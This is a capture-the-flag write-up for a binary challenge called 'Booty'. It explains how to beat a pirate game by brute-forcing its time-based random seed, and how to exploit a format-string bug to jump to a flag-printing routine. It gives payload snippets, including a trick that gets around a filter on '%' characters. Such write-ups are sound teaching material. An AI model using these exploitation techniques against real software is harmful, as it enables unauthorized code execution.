Exploitation: Booty
--------------------------------

The first look at the binary, we see that it is a turned based pirate fighting game where each player has multiple actions to choose from. Looking into the binary, we notice that once we reach level 9, we are greated with the message from the following print:

```
	...
    level_info->level_number = 0;
    printf(":: HAIL THE NEW PIRATE KING, ");
    printf(level_info->user_name);
    printf("\n\n");
    printf("%p marks the spot of your treasure!", &arg);
    ...
```

We notice that there is a possible format string attack here. We also notice that there is a routine at 0x80487C0, which reads and prints the flag. Fortunately, we are asked for our name before the start of the game, so we can put in the payload.We note that when we win, we also get an address leak to the stack, which helps us in creating a payload. 

Beating the game.
--------------------------------

Therefore, we go ahead to figure out a way to beat the game. There are no obvious buffer overflows, but we notice that the way the enemy moves are determined is a time(0) seed and a call to rand(). Therefore, the way we beat the game is to play it for several rounds, and brute force the initial time seed by searching the current time +/- 1000 seconds. This gives us the seed, which we can then predict all future enemy moves and play optimally. 

Payload 
--------------------------------

We want a payload to be:

```
giveflag = 0x80487C0
ownoffset = 30
payload = retaddr + '%0'+str((giveflag&0xffff)-4)+'d%'+str(ownoffset)+'$hn'
```

However, there is some input validation for the user name where the first '%' is replaced by a '\0'. Thankfully, there are several other issues that we can take advantage of. First, using a name without a '%' does not have proper null termination, and secondly, we are allowed to change our name and play the game again when we win.

Therefore, we can set our first payload to be:

```
first_name = '%%%%' + '%0'+str((giveflag&0xffff)-4)+'d%'+str(ownoffset)+'$hn'

```

and our second payload is just the return address which can be calculated after leaking the address from the first round.

```
# 4 bytes
second_name = retaddr
```

Since it isn't null terminated, the first 4 bytes will reaplce with the initial '%%%%' and the result string will be:

```
retaddr + '%0'+str((giveflag&0xffff)-4)+'d%'+str(ownoffset)+'$hn'                                 
```

which is exactly the payload we want, and we get the flag!

